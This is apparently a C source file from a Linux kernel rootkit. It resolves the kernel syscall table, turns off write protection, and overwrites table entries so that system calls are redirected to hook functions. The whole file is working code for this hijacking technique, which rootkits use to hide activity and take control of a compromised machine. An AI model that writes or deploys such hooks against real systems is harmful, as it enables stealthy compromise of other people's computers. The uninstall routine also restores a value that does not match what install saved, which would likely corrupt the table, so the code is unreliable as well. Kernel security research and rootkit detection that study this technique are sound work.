#include <linux/types.h>
#include <linux/errno.h>
#include "utils.h"
#include "syscall.h"
#include "../utils.h"

unsigned long *__sys_call_table = NULL;

/*
    Looks up the memory address of the kernel syscall table. This function
    is mandatory for doing any manipulation on syscall table entries.
*/
int rooti_resolve_syscall_table_addr()
{
    __sys_call_table = (unsigned long *)__kallsyms_lookup_name("sys_call_table");
    if (__sys_call_table == NULL) {
        ROOTI_DEBUG("could not resolve the address of sys_call_table");
        return -EFAULT;
    }
    return 0;
}

/*
    Hooks a syscall by overriding its entry in the kernel syscall table to point
    to the given hook function instead.
*/
int rooti_install_syscall_hook(struct rooti_syscall_hook *hook)
{
    // Save the address of the original syscall handler
    *((unsigned long *)hook->orig) = __sys_call_table[hook->idx];

    // Disable write protection
    rooti_unprotect_memory();

    // Override the syscall table entry
    __sys_call_table[hook->idx] = (unsigned long)hook->func;

    // Re-enable write protection
    rooti_protect_memory();

    return 0;
}

/*
    Removes a syscall hook by restoring the entry in the kernel syscall table
    to the address of the original syscall handler.
*/
void rooti_uninstall_syscall_hook(struct rooti_syscall_hook *hook)
{   
    // Disable write protection
    rooti_unprotect_memory();

    // Restore the syscall table entry
    __sys_call_table[hook->idx] = (unsigned long)hook->orig;

    // Re-enable write protection
    rooti_protect_memory();
}

// Installs all the syscall table hooks in the given hooks array.
int rooti_install_syscall_hooks(struct rooti_syscall_hook *hooks, size_t count)
{
    int ret;
    int i;
    for (i = 0; i < count; i++) {
        ret = rooti_install_syscall_hook(&hooks[i]);
        if (ret < 0) {
            goto error;
        }
    }
    return 0;

error:
    while (i > 0) {
        rooti_uninstall_syscall_hook(&hooks[--i]);
    }
    return ret;
}

// Uninstalls all registered syscall table hooks in the given hooks array.
void rooti_uninstall_syscall_hooks(struct rooti_syscall_hook *hooks, size_t count)
{
    for (int i = 0; i < count; i++) {
        rooti_uninstall_syscall_hook(&hooks[i]);
    }
}